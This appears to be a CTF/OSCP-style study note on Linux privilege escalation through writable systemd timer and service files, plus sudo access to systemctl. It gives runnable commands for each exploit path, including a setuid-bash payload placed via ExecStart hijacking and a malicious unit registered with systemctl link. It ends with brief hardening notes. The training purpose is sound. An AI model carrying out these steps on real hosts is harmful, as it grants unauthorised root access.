# 15 — Systemd Timer & Service Abuse

## Overview

Modern Linux distributions (Ubuntu 18.04+, most current Debian/RHEL) increasingly use **systemd timers** instead of traditional cron for scheduled tasks. The exploitation logic is conceptually similar to cron abuse (`03-cron-job-abuse.md`), but the mechanism, files, and enumeration commands are completely different — systemd units are declarative config files, not a single crontab line.

```
systemd timer (.timer) → triggers a service (.service) → service runs ExecStart= as a given user (often root)
```

---

## Step 1 — Enumerate Timers

```bash
systemctl list-timers --all
```
**Breakdown:**
- `systemctl list-timers` = shows all active and inactive timer units
- `--all` = include inactive/static timers too, not just currently scheduled ones
- Output columns: NEXT (next run time), LEFT (time remaining), LAST (last run), UNIT (timer name), ACTIVATES (which `.service` it triggers)

```bash
systemctl list-unit-files --type=timer
```
**Breakdown:**
- Lists every timer unit FILE known to the system, including disabled ones — broader than `list-timers`, which only shows loaded/active ones

---

## Step 2 — Inspect a Timer and Its Linked Service

```bash
cat /etc/systemd/system/backup.timer
```
**Example content:**
```ini
[Unit]
Description=Run backup every 5 minutes

[Timer]
OnBootSec=5min
OnUnitActiveSec=5min
Unit=backup.service

[Install]
WantedBy=timers.target
```
**Breakdown:**
- `[Timer]` section = defines the schedule
- `OnBootSec=5min` = first run, 5 minutes after boot
- `OnUnitActiveSec=5min` = repeat every 5 minutes after the last activation
- `Unit=backup.service` = which service this timer triggers — **this is the file you actually need to inspect for exploitation**

```bash
cat /etc/systemd/system/backup.service
```
**Example content:**
```ini
[Unit]
Description=Backup Service

[Service]
Type=oneshot
ExecStart=/opt/scripts/backup.sh
User=root
```
**Breakdown:**
- `Type=oneshot` = runs once and exits (vs `simple`, which stays running)
- `ExecStart=` = the actual command/script executed — **this is your target**
- `User=root` = explicitly runs as root (if omitted, defaults to root when managed system-wide)

---

## Step 3 — Check Write Access on Each Layer

There are three separate things worth checking:

```bash
# 1. Is the .service file itself writable?
ls -la /etc/systemd/system/backup.service

# 2. Is the .timer file writable?
ls -la /etc/systemd/system/backup.timer

# 3. Is the script referenced in ExecStart= writable?
ls -la /opt/scripts/backup.sh
```

---

## Exploit Path A — Writable ExecStart Script

Same technique as cron script abuse:

```bash
echo '#!/bin/bash' > /opt/scripts/backup.sh
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /opt/scripts/backup.sh
chmod +x /opt/scripts/backup.sh

# Wait for the timer to fire (check OnUnitActiveSec for interval)
/tmp/rootbash -p
id
```

---

## Exploit Path B — Writable .service File (Direct ExecStart Hijack)

If you can write the `.service` file directly, you don't even need to wait for the timer — you control exactly what runs:

```bash
cat /etc/systemd/system/backup.service
```

Modify `ExecStart=` directly:
```bash
sed -i 's|ExecStart=.*|ExecStart=/bin/bash -c "cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash"|' /etc/systemd/system/backup.service
```
**Breakdown:**
- `sed -i 's|ExecStart=.*|NEW_LINE|'` = replaces the entire `ExecStart=` line with our payload
- `|` used as delimiter since the replacement contains `/`

```bash
systemctl daemon-reload
systemctl start backup.service
```
**Breakdown:**
- `daemon-reload` = tells systemd to re-read unit files from disk (required after any manual edit — systemd caches parsed units)
- `systemctl start backup.service` = manually trigger it immediately, no need to wait for the timer

```bash
/tmp/rootbash -p
id
```

---

## Exploit Path C — sudo Access to systemctl (NOPASSWD)

Check `sudo -l` for systemctl-related entries:

```bash
sudo -l
# (root) NOPASSWD: /bin/systemctl restart backup.service
```

Even without write access to the unit files, if you can control the service's config through other means (e.g., an editable `.env` referenced by `EnvironmentFile=`, or a writable `ExecStartPre=` script), triggering a restart via sudo gives you the execution window.

GTFOBins documents a direct `systemctl` sudo abuse path too — if you can run ANY systemctl command as root with no restriction, you can create an entirely new malicious service:

```bash
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/bash -c "cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash"
[Install]
WantedBy=multi-user.target' > $TF

sudo systemctl link $TF
sudo systemctl enable --now $(basename $TF)
```
**Breakdown:**
- `mktemp` = creates a uniquely-named temp file, `.service` suffix appended for systemd to recognize it as a unit
- `systemctl link` = registers an arbitrary unit file with systemd without needing to place it in the standard unit directories
- `enable --now` = enables AND starts it immediately in one step

---

## Finding User-Writable Timers/Services Automatically

```bash
find /etc/systemd/system/ -writable 2>/dev/null
find /lib/systemd/system/ -writable 2>/dev/null
find /usr/lib/systemd/system/ -writable 2>/dev/null
find / -name "*.service" -writable 2>/dev/null
find / -name "*.timer" -writable 2>/dev/null
```
**Breakdown:**
- Systemd unit files can live in three standard locations depending on distro and install method — check all three
- `-writable` flags any you have modify access to, regardless of what runs them

---

## Why This Works (Conceptually)

- Systemd timers/services are designed to run with whatever privilege their `User=` directive specifies (root by default for system-level units)
- Any write access to the unit file itself, or to the executable/script it points to, is equivalent to controlling what root executes
- `systemctl daemon-reload` is the critical step that's easy to forget — without it, systemd keeps running the OLD cached version of the unit file in memory

---

## Detection / Hardening Notes (Blue Team)

```bash
# Audit permissions on all systemd unit directories
find /etc/systemd/system/ /lib/systemd/system/ -type f \( -perm -o+w -o -perm -g+w \) 2>/dev/null

# Restrict who can run systemctl via sudo — avoid blanket NOPASSWD entries
# Use systemd's built-in hardening directives (ProtectSystem=, NoNewPrivileges=, etc.) on services that process untrusted input
```

---

## Practice

Increasingly common on modern Ubuntu-based CTF/OSCP boxes where cron has been phased out in favor of systemd timers. Always run `systemctl list-timers --all` as a standard part of enumeration (ties into `00-enumeration.md`), right alongside checking `/etc/crontab`.

---

## Quick Checklist

```
[ ] systemctl list-timers --all                          → enumerate active timers
[ ] systemctl list-unit-files --type=timer                → enumerate all timer units (incl. disabled)
[ ] cat /etc/systemd/system/<name>.timer                  → find linked .service
[ ] cat /etc/systemd/system/<name>.service                → find ExecStart= target
[ ] ls -la <service file> <timer file> <ExecStart target> → check write access on all three
[ ] edit the writable script OR sed -i the ExecStart= line
[ ] systemctl daemon-reload                               → reload unit cache (REQUIRED after manual edit)
[ ] systemctl start <name>.service                        → trigger immediately (no waiting)
[ ] sudo -l | grep systemctl                              → check for sudo-based systemctl abuse
[ ] /tmp/rootbash -p / id                                 → confirm root
```
